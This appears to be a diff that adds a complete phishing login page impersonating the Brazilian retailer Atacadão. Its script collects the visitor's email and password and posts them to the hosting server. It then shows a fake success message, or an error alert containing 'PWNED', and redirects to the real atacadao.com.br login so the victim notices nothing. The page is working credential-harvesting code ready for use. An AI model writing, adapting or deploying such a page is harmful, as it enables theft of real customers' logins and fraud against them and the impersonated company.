@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .login-form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .login-form h2 {
+            margin-bottom: 20px;
+        }
+        .login-form input {
+            width: 95%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+        }
+        .login-form button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+  <form class="login-form" id="loginForm">
+      <h2>Login Atacadão</h2>
+      <input type="email" name="email" placeholder="Email" required>
+      <input type="password" name="password" placeholder="Senha" required>
+      <button type="submit">Login</button>
+  </form>
+
+  <script>
+      document.getElementById('loginForm').addEventListener('submit', function(event) {
+          event.preventDefault(); // Impede o envio padrão do formulário
+
+          const email = event.target.email.value;
+          const password = event.target.password.value;
+
+          const data = new URLSearchParams();
+          data.append('email', email);
+          data.append('password', password);
+
+          fetch('', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded'
+              },
+              body: data
+          })
+          .then(response => response.text())
+          .then(data => {
+              console.log('Success:', data);
+              alert('Login realizado com sucesso!');
+              window.location.href = 'https://atacadao.com.br/login';
+          })
+          .catch((error) => {
+              console.error('Error:', error);
+              alert('Ocorreu um erro ao realizar o login.\nPWNED');
+              window.location.href = 'https://atacadao.com.br/login';
+          });
+      });
+  </script>
+</body>
+</html>
+
+
